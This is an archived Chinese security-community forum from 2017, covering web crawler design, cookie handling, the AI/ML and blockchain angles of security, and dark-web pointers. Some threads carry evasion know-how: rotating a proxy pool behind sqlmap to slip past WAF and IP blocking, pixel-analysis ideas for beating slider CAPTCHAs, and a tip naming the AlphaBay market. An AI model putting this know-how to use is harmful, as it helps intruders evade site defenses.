<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 这种换代理适合fuzzing waf规则，实际拿来利用，内置的每个payload都会被干掉的

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__ replies to <img src="https://file.xiaomiquan.com/35/85/3585c8ae9ba10ae77e5e5a96d40d31ccc47e373cbcaceead666389734257bec2.jpg" width="25px"/> __C4r3Fr33__: 接入tor的话，目前部分网站防火墙会自动检测你的网络是不是tor，是的话会不让你访问的

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__ replies to <img src="https://file.xiaomiquan.com/35/85/3585c8ae9ba10ae77e5e5a96d40d31ccc47e373cbcaceead666389734257bec2.jpg" width="25px"/> __C4r3Fr33__: TOR速度太慢了，而且有时候connect establish都要花好久

<img src="https://file.xiaomiquan.com/35/85/3585c8ae9ba10ae77e5e5a96d40d31ccc47e373cbcaceead666389734257bec2.jpg" width="25px"/> __C4r3Fr33__ replies to <img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 链路聚合试过吗

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__ replies to <img src="https://file.xiaomiquan.com/35/85/3585c8ae9ba10ae77e5e5a96d40d31ccc47e373cbcaceead666389734257bec2.jpg" width="25px"/> __C4r3Fr33__: [呲牙][呲牙][呲牙]思路有了慢慢折腾下，如果不接入tor，并且不修改sqlmap源码的话，可以做一个爬虫，爬取一些免费代理网站，当然，爬取了之后自动检测代理是否可用的一些代码肯定是要写的，其实用requests也可以实现，然后保存为txt文档。

之后，再在本地创建一个服务端，用sqlmap代理服务端，在服务端切换代理池里面的ip。

总体的思路是，sqlmap代理本地服务端，本地服务端切换代理池ip，爬虫爬取可用代理ip存入代理池并检测。

<img src="https://file.xiaomiquan.com/35/85/3585c8ae9ba10ae77e5e5a96d40d31ccc47e373cbcaceead666389734257bec2.jpg" width="25px"/> __C4r3Fr33__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 对的，网上都有现成的工具，做个代理池


...

---


## Crawler


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-01:

> 匿名用户 提问：
弦哥好，听说Python最适合写爬虫，适合数据挖掘，我也想学学，您能给我推荐几本书或者其他学习资料或方法吗？谢谢！


确实非常适合写爬虫，也非常适合做数据挖掘。不过书，我现在暂时不知道推荐什么，因为我最近没怎么关注这类书籍，其他同学有推荐的吗？

如果你是初学者，可以看看半年前我分享基于 Scrapy 的一个小爬虫：

[https://github.com/evilcos/crawlers](https://github.com/evilcos/crawlers)



如果非书籍，建议你了解到的相关模块，直接查询官方手册吧。如果这个模块成熟，官方手册也会很完整。



...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 记得弦哥以前推荐过 从python开始学编程 和python核心编程，已入手，不会编程的两本都可以买，有编程经验的就核心编程吧😌

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 嗯，推荐过，不过这两本书并没特别去讲解爬虫或数据挖掘相关知识

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 推荐崔庆才的博客

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: python网络数据采集第四版，虽然不足够深入，但是涵盖较广，作为入门非常足够了。

<img src="https://file.xiaomiquan.com/fb/00/fb00c317b1c5f3808f9a2ed08d5fcdcccefa4d97571850c9ca906f70fe36747c.jpg" width="25px"/> __No0b__: 爬虫我是在网易云课堂和慕课网找的视频学的，python入门的话我是看的《从python开始学编程》这本书，入门视频教材的话我个人建议去闲鱼找找，会有收获。会搭梯子的话可以去youtube看看乾颐堂的python视频，都是基于py3讲的

<img src="https://file.xiaomiquan.com/69/06/6906ae93875b4c665752597faa63093862c424e4ddd841064d7ca6327827f840.jpg" width="25px"/> __Ю° ゜• .__: Python网络数据采集
Web安全深度刨析
Python编程实战
第一本正在学习，还不错...

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 请问cos牛最近在学pyqt，有个让我有点迷茫的就是我发现代码能实现的，qt designer大多都能画出来自动生成，因此学习pyqt是学习全部代码还是学习qt designer不能实现的一些槽函数

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 能达到目的为先，然后应该熟悉自己编写的核心逻辑

<img src="https://file.xiaomiquan.com/ec/84/ec84d014ff82e465ac73e371e3ed2a7326231d6f4d94b076e3e2fbcbf6971bdf.jpg" width="25px"/> __谈笑风生__: 请问cos大大，正准备学Python，但是不知道学2.x的版本还是3.x的版本？给点建议吧～

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/ec/84/ec84d014ff82e465ac73e371e3ed2a7326231d6f4d94b076e3e2fbcbf6971bdf.jpg" width="25px"/> __谈笑风生__: 初学者，没啥建议，未来迟早走向3，但是还得很多年，也说不定2会一直坚挺。话说回来，我一直在用2

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-03:

> 匿名用户 提问：
您好，我之前写过一个爬虫，发现每次从服务器获取到的cookie值都不相同。每次发送上次response里的cookie值也不对。这个可能是什么原因？我是遇到反爬虫了吗？可能是他在JavaScript 里面每次都生成新的cookie值吗？谢谢！


最简单的判断方式是，你用浏览器 F12 观察看看和你的爬虫请求响应之间的差异。



...

<img src="https://file.xiaomiquan.com/da/5e/da5ee5ad48504d28b2c7a23ff742022057f192ad8861539fcf13daa0a37d1096.jpg" width="25px"/> __TBot__: 抓取酷*收费音乐也是这么干的

<img src="https://file.xiaomiquan.com/a4/0e/a40eeddeb7bef4b0aed678372f9c672d8602ba537490f49fbfcdf17438bf2e18.jpg" width="25px"/> __一只野生的猴子__ replies to <img src="https://file.xiaomiquan.com/da/5e/da5ee5ad48504d28b2c7a23ff742022057f192ad8861539fcf13daa0a37d1096.jpg" width="25px"/> __TBot__: 是JavaScript每次更新cookie值么？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> Coco413@ATToT 提问：
请问cos一个好的爬虫除了具备分布式，去重，ajax ，登录扫描等，还应该具备哪些？还有个问题就是登录扫描的cookie 有效性改如何维持


如：

+ 字符集编码
+ HTML/XML不规范
+ 链接伪协议及不规范
+ 各种文件类型
+ 网页跳转：服务端、客户端（Meta、JavaScript、Flash等）
+ Cookie/认证会话维护
+ 代理维护
+ GPC(Cookie/Post/Get)参数提取
+ HTTP多种请求
+ 超时：连接超时/读取超时
+ JavaScript动态出来的链接
+ AJAX请求
+ 链接爬取去重算法
+ 广度深度算法
+ 并发：进程/线程/协程
+ 调度：同步/异步
+ 各种内存优化
+ 各种异常维护
+ 灵活配置
+ 灵活扩展
+ 优秀的文档...

Cookie 这个维护，本质原理：看浏览器怎么做的，尽量去模拟之。很多场景可以通过把过期时间设置为很久以后，但这个得看目标场景，差异不小。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 以上文字来自我以前的这篇文章：

[写爬虫很简单但也很难(附某美女站爬虫源码)](http://mp.weixin.qq.com/s/yRsH0mgcWkqQwJcCL9VnmA)



<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 感谢，我的场景是个漏扫，我现在做法是后台一直带这个cookie 访问并保存最新cookie 让他一直有效，我漏扫需要对应那个站时候再取对应的cookie ，但感觉不够高效。。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 在复杂业务场景下，Cookie 维护是很复杂的事，不一定最新 Cookie 就最有效，这个很头疼，不那么讲究的话，不一定非追求极致。

你感觉不高效的点是什么？

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不高效主要一是对系统资源调度要一直后台在访问，有时候可能触发对方网站反爬虫机制，还有即使维护了也有登陆失败等情况，所以请问cos对于扫描器相对环境不复杂的场景中会话改如何维护有什么建议吗？是直接不维护根据用户输入的headers判断失效时间，如果时间长就不维护，时间短就一直访问这样可以吗？感谢感谢！

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不高效主要是我一直在访问维护，即使一直访问还会出现登录失败等情况，请问cos对于一款扫描器来说如果要实现登录扫描这种不太复杂的场景下，实现登录扫描会话维护有什么好的建议吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 你得说你用什么编程语言来实现这个。

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Python..

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: Cookie维护你用的什么库

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Requests

<img src="https://file.xiaomiquan.com/bd/87/bd872d6bf8f2e37a8687398bc1bc0af07f9b896fc43c3663a77f830db1ac4c5c.jpg" width="25px"/> __ken🐜__: 小象学院有爬虫的课


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-08:

> Cris 提问：
如何爬取网站搜索栏自动补全的内容，给个思路，先行谢谢。比如我在google内搜索iPhone 7 y 就会有4个自动补全内容。前两个为 iPhone 7 adapter / iPhone 7 youtube。 说得比较啰嗦，谢谢。


你可以通过 Chrome 开发者工具抓包观察请求来了解本质，比如我输入 cos，在请求里看到如下链接：

[https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t](https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t)



内容是：

```
["cos",[["costco",0,[131]],["cos",0],["cosco",0],["costco ca",0,[131]]],{"j":"o5","k":1,"q":"ZEhkkVJAyiprdmxZvBP4Zy70OOx","t":{"bpc":false,"phi":0,"tlw":false}}]
```

也就是说这个是 AJAX 动态返回的 JSON 数据，这就是自动补全的内容。

那么后面的爬虫就简单了，你完全可以考虑用 PhantomJS 或 Headless Chrome 来应对这种动态 AJAX 内容。

思路如此，更多自己调试走起。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补上自动补全内容的一张图：

<img src="https://images.xiaomiquan.com/Flqt90v5S_Uf7pgdIKfOm54sPo0C?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:TfJEkZiinycHg2MOqXtVHkNdAbQ=" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 好的，谢谢，现在自己做电商公司，深感爬虫的重要性，拿别人的不靠谱，一是因为定制化，二是因为需求更新。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 一般都自己写，不会很难

<img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 然而爬虫是一个很长的产业链，一旦进入就必然与反爬做斗争，还有打码、动态代理...

<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__ replies to <img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__: 是的，没错，到最后都是拼团队，拼资源


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-11-20:


__#工具#__

 小密圈爬虫，只能爬下来自己保存哦[发呆]
可以爬取你账户下所有小密圈的内容。

用法：

扫码登录后

1.输入你的浏览器Agent信息。

2.输入你登陆后的token，也就是请求头里面的authorization

默认在当前目录下生成一个db.html页面。暂时不支持下载附件，这两天有空就加上去。
这作者明显代码水平拙劣，将就着用吧，有bug自己改[发呆]

[GitHub - xxxxxyyyy/craw: craw xiaomiquan](https://github.com/xxxxxyyyy/craw)




<img src="https://file.xiaomiquan.com/16e/85/6e85dbf77a8d14261c10def4d27871827bc23f17fdc84016d3aac038ef8c08ce.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1b7/f0/b7f049406c8b22b4e8a9db7939371ca9bfd88f9f922e8977051c4067f43c2c4d.png" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 补充：请在Linux下跑。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 哈哈哈，希望大家传播之前和我们打好招呼，没授权的传播，我们不会饶恕的[愉快]

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 哦，真巧，吐司也有人发了一个爬虫，那个不是我，我这个爬虫比他的智能，不需要手工输入圈子id

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 还有这种操作。哈哈。

<img src="https://file.xiaomiquan.com/6e/35/6e3503eedbcb357adc1deb9fa5a66b95c7189a86464fa1c62a0180cb32b7400f.jpg" width="25px"/> __Roll__: 之前用scrapy写了一个比较完整的，欢迎交流。当然，仅用于备份请勿传播。
[GitHub - Lodour/XMQ-BackUp: 小密圈备份](https://github.com/Lodour/XMQ-BackUp)



<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/6e/35/6e3503eedbcb357adc1deb9fa5a66b95c7189a86464fa1c62a0180cb32b7400f.jpg" width="25px"/> __Roll__: 原来已经有了[强]

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/6e/35/6e3503eedbcb357adc1deb9fa5a66b95c7189a86464fa1c62a0180cb32b7400f.jpg" width="25px"/> __Roll__: 比我的写的好多了，我就一个requests[撇嘴]

<img src="https://file.xiaomiquan.com/6e/35/6e3503eedbcb357adc1deb9fa5a66b95c7189a86464fa1c62a0180cb32b7400f.jpg" width="25px"/> __Roll__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: [呲牙]响应余弦大大的scrapy推广


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-12-04:


__#姿势#__

  在web爬虫抓取技术领域，存在着很多着抓取与反抓取攻防对抗，本文结合web crawler技术的发展，探讨了很多web爬虫攻防技术的黑魔法，并且文末发布了一个基于headless chrome crawler的web抓取框架：webster，支持docker一键部署。

来自@朱英达-Sugar  的给力分享。


[如果有人问你爬虫抓取技术的门道，请叫他来看这篇文章 - 掘金](https://juejin.im/post/5a22af716fb9a045132a825c)





---

## 验证码



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-08:

> GeekaLeo 提问：
极验验证有没有什么巧妙的思路拿下？（传统思路：搜集人拖动鼠标特征的大量数据，提炼特征，也可结合机器学习使其更为精准）


大家一起来探讨吧🤕



...

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: 大学狗一枚 暑假准备写的项目也是和验证码有关的 刚看了看极验验证的验证码 第一代的字符验证码我想拿下的方法应该都是比较成熟的 二值化 去噪 处理字符 匹配字符 第二代滑动验证的话我觉得是现在较为普遍的 看直播的时候经常看到 对于这个的拿下 我是这样子想得 细心观察你会发现滑块要拖动到的位置 形状与滑块相同 更重要的是颜色明显是比背景图片的颜色要深沉的 这样的话可以利用这个特点读取滑动验证码图片(这里的图片是模拟鼠标点击之后出现要拖动的图片) 分析里面的像素(玩过ctf隐写里面就有个LSB 这里的话也要用类似的手段分析像素) 找到像素颜色深度明显不一样的地方 而且这个滑动验证并不是要你百分百位置正确 有误差也是可以通过的 这点也可以利用 对于第三代的点击行为验证码 暂时没有思路 我看一下相关文档看看有没有什么好点子

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__: 如果你动动手就好了，你就会卡在拖动轨迹上，拖动轨迹的解决方法大致是我问题里说的那样。你这也是传统思路～


...

---

## Dark Web


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-29:


__#讨论#__

有人问暗网神秘不神秘，其实一点都不神秘，完全不需要任何技术含量都可以玩进去。但本圈子不打算去分享暗网及翻墙相关的知识，就怕万一圈子被和谐了，那可不好。

不过给个 tip 吧：

Google AlphaBay

别沉迷，好好学习，天天向上。

明天端午节休息一天，打算后天开始每天分享一个好利器，赞同不赞同呀？

对了，基础的分享也会间歇性进行，希望大家能打好相关基础。

<img src="https://images.xiaomiquan.com/Ft64BsP73apLWRMk--iTBCfPS5Gc?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:9BH84oFu3QnJTg0hzkrkK6AVRFE=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/25/54/2554db8a586cc8faa9975308b54f5988af68e0b341cb88b77e90e4c05ebeab88.jpg" width="25px"/> __Immortals__: alphabay，就像淘宝般存在，eth.xmr.btc主要流通货币。

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 这个看的懂嘿嘿一下就上了，，发现你用tor不用代理直接就能上去

...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-18:

关于dark Web(不限于Tor)，关于Anonymous network，darknet，这个博客科普、辟谣、指路了非常多信息，推荐好好阅读每篇文章！

[Secrets of the Dark | Lighting a match in the dark...](https://direclown.wordpress.com)



<img src="https://file.xiaomiquan.com/51/c6/51c6eee1c7adb3e5d91c5c6b80466f3043b7236c27a734fc97ff7e5a73852821.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/b1/56/b156dd5922a0993bd78f5d2404738b9944e81129e5276fcd59a045192247509c.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/c5/cf/c5cf53d012e4270479ea8b3c10283f33d2fd27f0567f860006f1c622f806e15a.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/74/3f/743f78265bfd6981b27d8fc6ee4a7fced0cf6478fcaa48667f1ab24f8a60d7f1.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 不错，很详细


...

---

## AI ML


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦大大，请问下目前安全圈跟现在很火的人工智能有什么结合点比较有前景的吗？你作为行业里面的资深专家，关于两者的结合有比较看好的未来发展方向吗？目前在学习机器学习方面的东西，还希望能得到指点


我也看重这个结合的未来，攻防领域很多应该都可以，尤其是涉及到需要大量运行、大量计算、大量样本的场景下。

我最近在写一个 XSS 漏洞 fuzzing 框架，就在琢磨如何融入 AI，就这么小的一个点，如果真融入好了，我会很兴奋。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 匿名用户 提问：
请问，现在的安全公司，应用机器学习的多吗，机器学习在安全领域有哪些方面的应用？


其实算多，现在机器学习一般用于防御、流量分析、日志分析、威胁分析这方面。一般数据大了或样本多了后都会上机器学习相关算法。



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 我觉得扫描器是不是应该也可以加进去，机器学习生成payload之类


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-22:

> 匿名用户 提问：
余弦大大求教，机器学习在安全领域应用多吗？我知道可以用在waf，ddos防御上，但不知道效果咋样。


多呀，未来这个会是竞争壁垒，无论是对个人来说，还是对相关产品。这个未来很快就会到。

机器学习效果还是很明显的，对于大数据场景来说，可惜我还是半吊子，不敢乱说，等有些突破了再来说吧。



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 点赞，个人想往这个领域发展，一方面有所壁垒，一方面又是网络安全行业。生存不易，想去做黑产了都。。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 都不容易，黑产可以了解却不能踏进去。

<img src="https://file.xiaomiquan.com/79/68/7968b751ccc4269af04247db62808573076a3fce2db099058271513bbfb42d2c.jpg" width="25px"/> __王同学__: 道哥的黑板报，
[弹性安全网络 -- 构建下一代安全的互联网](http://mp.weixin.qq.com/s/epFSC88J7LF3BGwQdoZ-Rg)



<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/79/68/7968b751ccc4269af04247db62808573076a3fce2db099058271513bbfb42d2c.jpg" width="25px"/> __王同学__: 懂技术，懂运营，懂管理。最重要的是道哥很会做影响力！技术其实并不是最重要的

<img src="https://file.xiaomiquan.com/79/68/7968b751ccc4269af04247db62808573076a3fce2db099058271513bbfb42d2c.jpg" width="25px"/> __王同学__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 很赞同！


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-02:


__#资源#__

  推荐了解了解 AI 领域得掌握的 TensorFlow：


[独家 | 一文读懂TensorFlow（附代码、学习资料）](https://mp.weixin.qq.com/s/SlitM8JToD7dN5E5Ue9wjA)




<img src="https://file.xiaomiquan.com/14e/db/4edbeb2147e80b86f44c60eddf09b5a129961df7e48d102f4654a31e3bc38190.jpg" width="50%" height="50%" align="middle"/>


---

## Blockchain


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-12-14:


__#经验#__

建议大家开始关注“区块链”技术，在自己的技能树上多一个这个是好事，至少可以很好避免成为投机者中的韭菜。玩安全的，可以探索这个领域的安全问题。

本圈就多说几句吧：

